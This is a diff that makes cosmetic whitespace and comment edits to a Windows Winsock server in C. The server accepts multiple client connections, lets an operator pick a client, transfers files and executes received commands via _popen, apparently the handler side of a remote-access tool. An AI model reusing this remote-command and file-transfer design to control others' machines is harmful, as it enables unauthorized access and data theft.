@@ -22,7 +22,6 @@ void terminate_server(SOCKET socket, char* error) {
 
 	closesocket(socket);
 	WSACleanup();
-
 	exit(err_code);
 }
 
@@ -31,7 +30,6 @@ const SOCKET create_socket() {
 	// Initialize winsock.
 	WSADATA wsData;
 	WORD ver = MAKEWORD(2, 2);
-
 	int wsResult = WSAStartup(ver, &wsData);
 
 	// Create the server socket object.
@@ -53,8 +51,9 @@ const SOCKET create_socket() {
 void bind_socket(const SOCKET listen_socket) {
 	// Create hint structure.
 	struct sockaddr_in hint;
-	hint.sin_family = AF_INET;
 
+	// Assign member values.
+	hint.sin_family = AF_INET;
 	hint.sin_port = htons(PORT);
 	hint.sin_addr.S_un.S_addr = INADDR_ANY;
 
@@ -69,13 +68,14 @@ void bind_socket(const SOCKET listen_socket) {
 
 // Thread to recursively accept connections.
 DWORD WINAPI accept_conns(LPVOID* lp_param) {
+	// Assign member values to connection map object/structure.
 	Conn_map* conns = (Conn_map*)lp_param;
 	conns->alloc = MEM_CHUNK;
-
 	conns->size = 0;
 	conns->clients = malloc(conns->alloc * sizeof(Conn));
-
 	conns->listen_socket = create_socket();
+
+	// Bind socket to port.
 	bind_socket(conns->listen_socket);
 
 	while (1) {
@@ -108,7 +108,6 @@ DWORD WINAPI accept_conns(LPVOID* lp_param) {
 		// Add hostname string and client_socket object to Conn structure.
 		conns->clients[conns->size].host = host;
 		conns->clients[conns->size].sock = client_socket;
-
 		conns->size++;
 
 		// Release our mutex now.
@@ -132,11 +131,9 @@ int send_file(char* const buf, const size_t cmd_len, const SOCKET client_socket)
 
 	// If the file exists:
 	if (fd) {
-		// Get file size.
+		// Get file size and serialize f_size.
 		fseek(fd, 0L, SEEK_END);
 		f_size = ftell(fd);
-
-		// Serialize f_size.
 		bytes = htonl(f_size);
 		fseek(fd, 0L, SEEK_SET);
 	}
@@ -185,7 +182,7 @@ int recv_file(char* const buf, const size_t cmd_len, const SOCKET client_socket)
 	// Initialize i_result to true.
 	int i_result = 1;
 
-	// Varaible to keep track of downloaded data.
+	// Varaible to keep track of downloaded data bytes.
 	long int total = 0;
 
 	// Receive all file bytes/chunks and write to file until total == file size.
@@ -331,10 +328,9 @@ void interact(Conn_map* conns, char* const buf, const int client_id) {
 
 // Function to execute command.
 void exec_cmd(char* const buf) {
-	// Call Popen to execute command(s) and read the process' output.
+	// Call Popen to execute command(s) and read the processes' output.
 	FILE* fpipe = _popen(buf, "r");
 	fseek(fpipe, 0, SEEK_END);
-
 	size_t cmd_len = ftell(fpipe);
 	fseek(fpipe, 0, SEEK_SET);
 
@@ -358,9 +354,7 @@ int main(void) {
 
 	conns.ghMutex = CreateMutex(NULL, FALSE, NULL);
 	HANDLE acp_thread = CreateThread(0, 0, accept_conns, &conns, 0, 0);
-
 	HANDLE  hColor;
-
 	hColor = GetStdHandle(STD_OUTPUT_HANDLE);
 	SetConsoleTextAttribute(hColor, 9);
 
